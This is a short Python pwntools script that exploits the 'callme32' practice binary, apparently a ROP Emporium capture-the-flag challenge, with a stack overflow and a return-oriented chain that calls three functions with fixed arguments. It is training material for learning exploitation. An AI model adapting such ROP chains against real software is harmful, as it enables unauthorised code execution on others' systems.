from pwn import *

sh = process("./callme32")

# address
callme_one = p32(0x080484f0)    # callme_one
callme_two = p32(0x08048550)    # callme_two
callme_three = p32(0x080484e0)  # callme_three
argu = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)    # argu = 0xdeadbeef + 0xcafebabe + 0xd00df00d
pop_3 = p32(0x080487f9)        # pop 3 argu in stack 

# payload
payload = b'a'*40  + p32(0xdeadbeef) + callme_one + pop_3 + argu
payload += callme_two + pop_3 + argu
payload += callme_three + pop_3 + argu

sh.sendline(payload)
sh.interactive()
